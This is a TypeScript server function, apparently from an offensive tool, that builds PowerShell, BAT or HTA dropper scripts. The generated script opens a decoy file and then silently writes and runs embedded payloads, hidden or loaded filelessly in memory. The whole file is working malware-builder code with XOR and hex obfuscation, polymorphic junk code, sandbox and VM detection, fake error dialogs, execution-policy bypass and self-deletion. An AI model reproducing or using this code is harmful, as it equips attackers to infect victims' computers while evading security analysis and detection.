
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const MergePayloadsInputSchema = z.object({
  payloads: z.array(FileInputSchema),
  benign: FileInputSchema,
  outputFormat: z.enum(['ps1', 'bat', 'hta']),
  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
  encryptionKey: z.string().optional(),
  useFragmentation: z.boolean().optional(),
  executionDelay: z.string().optional(),
  fileless: z.boolean().optional(),
  fakeErrorMessage: z.string().optional(),
  selfDestruct: z.boolean().optional(),
  enableSandboxDetection: z.boolean().optional(),
  checkCpuCores: z.boolean().optional(),
  checkRam: z.boolean().optional(),
  checkVmProcesses: z.boolean().optional(),
  sandboxAbortMessage: z.string().optional(),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

// XOR Encryption function
function xorEncrypt(data: string, key: string): string {
    let result = '';
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

// Helper to generate random variable names for polymorphism
const randomVar = (prefix = '$') => `${prefix}${Math.random().toString(36).substring(2, 9)}`;

// Helper to insert random junk code for polymorphism
const junkCode = (type: 'ps1' | 'vbs'): string => {
    const comments = [
        "Validate input parameters", "Initialize components", "Loop through result set", 
        "Memory cleanup", "Check for updates", "Log event"
    ];
    const randComment = comments[Math.floor(Math.random() * comments.length)];
    if (type === 'ps1') {
        const junkOps = [
            `$dummy = 1..10 | ForEach-Object { $_ * ${Math.floor(Math.random() * 100)} } # Perform mock calculation`,
            `Start-Sleep -Milliseconds ${Math.floor(Math.random() * 50) + 10} # Brief pause`,
            `$tempVar = Get-Date # Store temporary value`
        ];
        return `# ${randComment}\n${junkOps[Math.floor(Math.random() * junkOps.length)]}`;
    } else { // vbs
         const junkOps = [
            `Dim i_junk: For i_junk = 0 To ${Math.floor(Math.random() * 10)}: Next ' Junk loop`,
            `Dim junk_var: junk_var = Now() ' Get current time`,
        ];
        return `' ${randComment}\n${junkOps[Math.floor(Math.random() * junkOps.length)]}`;
    }
}

const generatePowershellDropper = (input: Required<MergePayloadsInput>): string => {
    // Random variable names
    const v = {
        isSandbox: randomVar(),
        vmProcesses: randomVar(),
        tempPath: randomVar(),
        benignFilePath: randomVar(),
        benignFileBase64: randomVar(),
        key: randomVar(),
    };
    
    let delaySection = '';
    if (input.executionDelay && !isNaN(parseInt(input.executionDelay, 10))) {
        delaySection = `Start-Sleep -Seconds ${parseInt(input.executionDelay, 10)}`;
    }

    let fakeErrorSection = '';
    if (input.fakeErrorMessage) {
        fakeErrorSection = `
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("${input.fakeErrorMessage}", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        `;
    }
    
    let selfDestructSection = '';
    if (input.selfDestruct) {
        selfDestructSection = `
try {
    ${junkCode('ps1')}
    Remove-Item -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
} catch {}
        `;
    }
    
    let antiAnalysisSection = '';
    if (input.enableSandboxDetection) {
        const checks = [];
        if (input.checkCpuCores) checks.push('(Get-CimInstance Win32_Processor).NumberOfCores -le 2');
        if (input.checkRam) checks.push('(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB -lt 4');
        if (input.checkVmProcesses) checks.push(`$${v.vmProcesses} = "vmtoolsd", "vboxservice"; Get-Process | Where-Object { $${v.vmProcesses} -contains $_.Name } | Select-Object -First 1`);
        
        if (checks.length > 0) {
            antiAnalysisSection = `
${junkCode('ps1')}
${v.isSandbox} = ${checks.join(' -or ')}
if (${v.isSandbox}) {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show("${input.sandboxAbortMessage}", "Application Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    ${selfDestructSection}
    exit
}
            `;
        }
    }


    const payloadProcessingLoops = input.payloads.map((payload) => {
        // Random variable names per payload
        const p_v = {
            varSuffix: Math.random().toString(36).substring(2, 6),
            payloadChunks: randomVar(),
            payloadData: randomVar(),
            encryptedBytes: randomVar(),
            keyBytes: randomVar(),
            payloadFileBytes: randomVar(),
            hexString: randomVar(),
            assembly: randomVar(),
            entryPoint: randomVar(),
            payloadFilePath: randomVar(),
        };

        let payloadSection: string;
        let payloadDecoding: string;

        if (input.useFragmentation) {
            const chunkSize = 1000;
            const chunks = [];
            for (let i = 0; i < payload.content.length; i += chunkSize) {
                chunks.push(payload.content.substring(i, i + chunkSize));
            }
            const chunkString = chunks.map(c => `@"${c}"@`).join(',');
            payloadSection = `${p_v.payloadChunks} = ${chunkString}\n${p_v.payloadData} = ${p_v.payloadChunks} -join ''`;
        } else {
            payloadSection = `${p_v.payloadData} = @"\n${payload.content}\n"@`;
        }

        if (input.obfuscationType === 'xor' && input.encryptionKey) {
            payloadDecoding = `
${junkCode('ps1')}
${v.key} = "${input.encryptionKey}"
${p_v.encryptedBytes} = [System.Convert]::FromBase64String(${p_v.payloadData})
${p_v.keyBytes} = [System.Text.Encoding]::ASCII.GetBytes(${v.key})
${p_v.payloadFileBytes} = New-Object byte[] ${p_v.encryptedBytes}.Length
for ($i = 0; $i -lt ${p_v.encryptedBytes}.Length; $i++) {
    ${p_v.payloadFileBytes}[$i] = ${p_v.encryptedBytes}[$i] -bxor ${p_v.keyBytes}[$i % ${p_v.keyBytes}.Length]
}`;
        } else if (input.obfuscationType === 'hex') {
            payloadDecoding = `
${p_v.hexString} = ${p_v.payloadData} -replace '[\\s\\r\\n]'
${p_v.payloadFileBytes} = New-Object byte[] (${p_v.hexString}.Length / 2)
for ($i = 0; $i -lt ${p_v.hexString}.Length; $i += 2) {
    ${p_v.payloadFileBytes}[$i/2] = [System.Convert]::ToByte(${p_v.hexString}.Substring($i, 2), 16)
}`;
        } else { // 'none' or default to Base64
            payloadDecoding = `\n${p_v.payloadFileBytes} = [System.Convert]::FromBase64String(${p_v.payloadData})`;
        }
        
        let executionSection: string;
        if (input.fileless) {
            executionSection = `
try {
    ${p_v.assembly} = [System.Reflection.Assembly]::Load(${p_v.payloadFileBytes})
    ${p_v.entryPoint} = ${p_v.assembly}.EntryPoint
    if (${p_v.entryPoint}) {
        ${p_v.entryPoint}.Invoke($null, $null)
    } else {
        ${p_v.payloadFilePath} = Join-Path ${v.tempPath} "${payload.name}"
        [IO.File]::WriteAllBytes(${p_v.payloadFilePath}, ${p_v.payloadFileBytes})
        Start-Process -FilePath ${p_v.payloadFilePath} -WindowStyle Hidden
    }
} catch {
    ${p_v.payloadFilePath} = Join-Path ${v.tempPath} "${payload.name}"
    [IO.File]::WriteAllBytes(${p_v.payloadFilePath}, ${p_v.payloadFileBytes})
    Start-Process -FilePath ${p_v.payloadFilePath} -WindowStyle Hidden
}`;
        } else {
            executionSection = `
${p_v.payloadFilePath} = Join-Path ${v.tempPath} "${payload.name}"
[IO.File]::WriteAllBytes(${p_v.payloadFilePath}, ${p_v.payloadFileBytes})
Start-Process -FilePath ${p_v.payloadFilePath} -WindowStyle Hidden`;
        }

        return `
# Processing Payload: ${payload.name}
${payloadSection}
${payloadDecoding}
${executionSection}
`;
    }).join('\n');

    return `
${antiAnalysisSection}

${v.tempPath} = $env:TEMP
${v.benignFilePath} = Join-Path ${v.tempPath} "${input.benign.name}"

try {
    ${v.benignFileBase64} = @"
${decodeDataUri(input.benign.content)}
"@
    
    [IO.File]::WriteAllBytes(${v.benignFilePath}, [System.Convert]::FromBase64String(${v.benignFileBase64}))
    Start-Process ${v.benignFilePath}

    ${fakeErrorSection}

    ${delaySection}

    ${payloadProcessingLoops}
} catch {
    # Fail silently
} finally {
    ${selfDestructSection}
}
`;
};


/**
 * Generates a dropper script that embeds multiple files.
 * When run, it drops the benign file, opens it, and executes the payloads.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);
    
    const filledInput: Required<MergePayloadsInput> = {
        ...{
            encryptionKey: 'netrax_default_key',
            useFragmentation: false,
            executionDelay: '',
            fileless: false,
            fakeErrorMessage: '',
            selfDestruct: false,
            enableSandboxDetection: false,
            checkCpuCores: false,
            checkRam: false,
            checkVmProcesses: false,
            sandboxAbortMessage: '',
        },
        ...validatedInput,
    };

    const processedPayloads = filledInput.payloads.map(payload => {
        let payloadBase64 = decodeDataUri(payload.content);
        let payloadString = payloadBase64; 

        if (filledInput.obfuscationType === 'xor' && filledInput.encryptionKey) {
            const rawPayload = Buffer.from(payloadBase64, 'base64');
            const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), filledInput.encryptionKey), 'latin1');
            payloadString = encryptedPayload.toString('base64');
        } else if (filledInput.obfuscationType === 'hex') {
            payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
        }
        
        return { name: payload.name, content: payloadString };
    });
    
    const finalInput = { ...filledInput, payloads: processedPayloads };
    let scriptContent = '';

    switch (filledInput.outputFormat) {
        case 'ps1':
            scriptContent = generatePowershellDropper(finalInput);
            break;
        
        case 'bat':
            const psScript = generatePowershellDropper(finalInput);
            const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
            let batContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
            if(filledInput.selfDestruct) {
                batContent += `\n(goto) 2>nul & del "%~f0"`;
            }
            scriptContent = batContent;
            break;

        case 'hta':
            const hta_v = {
                objShell: randomVar(''),
                objFSO: randomVar(''),
                tempPath: randomVar(''),
                benignFilePath: randomVar(''),
                benignB64: randomVar(''),
                key: randomVar(''),
                oXML: randomVar(''),
                oNode: randomVar(''),
            };

            const htaPayloadProcessing = finalInput.payloads.map((payload) => {
                const p_v = {
                    payloadData: randomVar(''),
                    encryptedBytes: randomVar(''),
                    keyBytes: randomVar(''),
                };

                let payloadProcessingSection: string;

                if (finalInput.useFragmentation) {
                    const chunkSize = 500;
                    const chunks = [];
                    for (let i = 0; i < payload.content.length; i += chunkSize) {
                        chunks.push(payload.content.substring(i, i + chunkSize));
                    }
                    const chunkString = chunks.map(c => `"${c}"`).join(" & ");
                    payloadProcessingSection = `${p_v.payloadData} = ${chunkString}`;
                } else {
                    payloadProcessingSection = `${p_v.payloadData} = "${payload.content}"`;
                }

                if (finalInput.obfuscationType === 'xor' && finalInput.encryptionKey) {
                    payloadProcessingSection += `
                    ${junkCode('vbs')}
                    ${hta_v.key} = "${finalInput.encryptionKey}"
                    
                    Dim ${p_v.encryptedBytes}, ${p_v.keyBytes}, i
                    Set ${hta_v.oXML} = CreateObject("MSXML2.DOMDocument")
                    Set ${hta_v.oNode} = ${hta_v.oXML}.CreateElement("base64")
                    ${hta_v.oNode}.DataType = "bin.base64"
                    ${hta_v.oNode}.Text = ${p_v.payloadData}
                    ${p_v.encryptedBytes} = ${hta_v.oNode}.NodeTypedValue
                    
                    ${p_v.keyBytes} = StrToBytes(${hta_v.key})
                    
                    For i = 0 To UBound(${p_v.encryptedBytes})
                        ${p_v.encryptedBytes}(i) = ${p_v.encryptedBytes}(i) Xor ${p_v.keyBytes}(i Mod UBound(${p_v.keyBytes}))
                    Next
                    
                    Call BytesToFile(${p_v.encryptedBytes}, ${hta_v.tempPath} & "\\${payload.name}")
                    `;
                } else if (finalInput.obfuscationType === 'hex') {
                     payloadProcessingSection += `Call HexToFile(${p_v.payloadData}, ${hta_v.tempPath} & "\\${payload.name}")`;
                } else { // none (base64)
                     payloadProcessingSection += `Call Base64ToFile(${p_v.payloadData}, ${hta_v.tempPath} & "\\${payload.name}")`;
                }
                
                return `
                ' Payload: ${payload.name}
                ${payloadProcessingSection}
                ${hta_v.objShell}.Run "cmd /c """ & ${hta_v.tempPath} & "\\${payload.name}" & """", 0, False
                `;
            }).join('\n');
            
            let selfDestructHta = '';
            if (finalInput.selfDestruct) {
                selfDestructHta = `
                On Error Resume Next
                ${hta_v.objFSO}.DeleteFile(window.document.location.pathname)
                On Error GoTo 0
                `;
            }

            const vbsPayload = `
                Set ${hta_v.objShell} = CreateObject("WScript.Shell")
                Set ${hta_v.objFSO} = CreateObject("Scripting.FileSystemObject")
                
                ${junkCode('vbs')}
                ${hta_v.tempPath} = ${hta_v.objShell}.ExpandEnvironmentStrings("%TEMP%")
                ${hta_v.benignFilePath} = ${hta_v.tempPath} & "\\${finalInput.benign.name}"

                ${hta_v.benignB64} = "${decodeDataUri(finalInput.benign.content)}"
                Call Base64ToFile(${hta_v.benignB64}, ${hta_v.benignFilePath})
                ${hta_v.objShell}.Run "cmd /c """ & ${hta_v.benignFilePath} & """", 1, True

                ${finalInput.fakeErrorMessage ? `MsgBox "${finalInput.fakeErrorMessage}", 16, "Error"` : ''}

                ${finalInput.executionDelay ? `WScript.Sleep ${parseInt(finalInput.executionDelay, 10) * 1000}` : ''}
                
                ${htaPayloadProcessing}
                
                ${selfDestructHta}

                window.close()

                Sub HexToFile(sHex, sFile)
                    Dim objFSO_h, objFile_h, i_h
                    Set objFSO_h = CreateObject("Scripting.FileSystemObject")
                    Set objFile_h = objFSO_h.CreateTextFile(sFile, True)
                    For i_h = 1 to Len(sHex) Step 2
                        objFile_h.Write Chr(CLng("&H" & Mid(sHex, i_h, 2)))
                    Next
                    objFile_h.Close
                End Sub
                
                Sub BytesToFile(bytes, filename)
                    Dim oStream
                    Set oStream = CreateObject("ADODB.Stream")
                    oStream.Type = 1 ' adTypeBinary
                    oStream.Open
                    oStream.Write bytes
                    oStream.SaveToFile filename, 2 ' adSaveCreateOverWrite
                    oStream.Close
                End Sub

                Sub Base64ToFile(B64, FileName)
                    Dim oXML_b64, oNode_b64, oStream_b64
                    Set oXML_b64 = CreateObject("MSXML2.DOMDocument")
                    Set oNode_b64 = oXML_b64.CreateElement("base64")
                    oNode_b64.DataType = "bin.base64"
                    oNode_b64.Text = B64
                    Set oStream_b64 = CreateObject("ADODB.Stream")
                    oStream_b64.Type = 1
                    oStream_b64.Open
                    oStream_b64.Write oNode_b64.NodeTypedValue
                    oStream_b64.SaveToFile FileName, 2
                    oStream_b64.Close
                End Sub

                Function StrToBytes(s)
                    Dim bytesArr, i_s
                    ReDim bytesArr(Len(s) - 1)
                    For i_s = 1 To Len(s)
                        bytesArr(i_s-1) = Asc(Mid(s, i_s, 1))
                    Next
                    StrToBytes = bytesArr
                End Function
            `;
            scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
            break;

        default:
             return { success: false, error: 'Invalid or unsupported output format.' };
    }

    return {
      success: true,
      scriptContent: scriptContent,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
